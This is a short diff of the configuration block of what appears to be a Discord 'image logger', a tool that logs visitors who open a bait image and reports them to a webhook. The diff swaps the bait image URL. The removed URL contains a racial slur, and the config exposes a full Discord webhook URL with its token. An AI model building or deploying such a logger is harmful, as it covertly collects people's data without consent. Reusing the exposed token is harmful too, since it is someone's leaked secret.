@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1398264234709745704/vcu5cHDwYm10d4fo6yqFn1ZKdsi0JX0eXVFjW8Rrfh70FjGNTSNdUaJHjuWczwHyayfY",
-    "image": "https://media.discordapp.net/attachments/1050438750175514634/1050454698471215124/no_niggas.gif", # You can also have a custom image by using a URL argument
+    "image": "https://redengine.net/", # You can also have a custom image by using a URL argument
 
      # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
